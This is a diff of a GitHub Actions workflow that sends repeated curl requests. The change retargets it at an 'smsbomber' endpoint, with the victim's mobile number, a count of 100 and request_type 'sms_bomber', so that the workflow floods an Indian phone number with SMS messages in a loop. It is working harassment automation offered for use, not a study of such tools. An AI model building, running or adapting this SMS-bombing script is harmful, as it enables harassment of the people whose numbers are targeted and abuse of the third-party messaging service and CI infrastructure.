@@ -36,7 +36,7 @@ jobs:
           LOOP_COUNT="${{ github.event.inputs.loop_count }}"
           CSRF_TOKEN="${{ github.event.inputs.csrf_token }}"
           COUNTRY_CODE="91"
-          API_URL="https://greatonlinetools.com/api/xyz"
+          API_URL="https://greatonlinetools.com/smsbomber/endpoints/api/receive_number.php"
 
           # Initialize counters
           SUCCESS_COUNT=0
@@ -65,7 +65,7 @@ jobs:
               -H 'sec-fetch-site: same-origin' \
               -H 'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1' \
               -H 'x-requested-with: XMLHttpRequest' \
-              --data-raw "{\"user-id\":\"$USER_ID\",\"count\":100,\"country_code\":\"$COUNTRY_CODE\",\"curr_count\":$CURRENT_COUNT,\"csrf_token\":\"$CSRF_TOKEN\",\"request_type\":\"normal\"}")
+              --data-raw "{\"mobile\":\"$USER_ID\",\"count\":100,\"country_code\":\"$COUNTRY_CODE\",\"curr_count\":$CURRENT_COUNT,\"csrf_token\":\"$CSRF_TOKEN\",\"request_type\":\"sms_bomber\"}")
 
             # Extract HTTP status code (last line)
             HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
